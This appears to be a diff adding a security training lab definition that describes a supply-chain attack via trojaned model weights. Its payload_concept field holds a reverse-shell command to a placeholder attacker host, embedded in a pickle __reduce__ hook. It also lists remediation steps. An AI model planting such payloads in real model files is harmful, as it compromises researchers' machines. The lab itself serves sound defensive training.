@@ -1,0 +1,29 @@
+lab_id: LAB-05
+title: "The Trojan Model: Supply Chain Attack"
+vulnerability: "Malicious Model Weights / Supply Chain"
+difficulty: "Advanced"
+
+scenario: >
+  You are an attacker who has uploaded a popular-looking model to a community 
+  hub. The model is a 'Trojan' that executes a reverse shell when loaded 
+  using the standard `torch.load()` or `pickle` methods.
+
+what_to_test: "The model loading pipeline and dependency management."
+
+why: >
+  Many AI researchers blindly download and run code/models from the internet. 
+  Since some model formats execute arbitrary Python code upon loading, this is 
+  a massive vector for workstation compromise.
+
+payload_concept: >
+  Create a model where `__reduce__` or a similar serialization hook contains 
+  `os.system('sh -i >& /dev/tcp/attacker.com/4444 0>&1')`.
+
+expected_outcome: >
+  The researcher's machine connects back to the attacker's server as soon as 
+  `model = torch.load('popular_model.pth')` is executed.
+
+remediation:
+  - "NEVER use torch.load() or pickle on untrusted files."
+  - "Use 'safetensors' (from HuggingFace) which is a zero-code-execution format."
+  - "Audit model weights using security scanners."
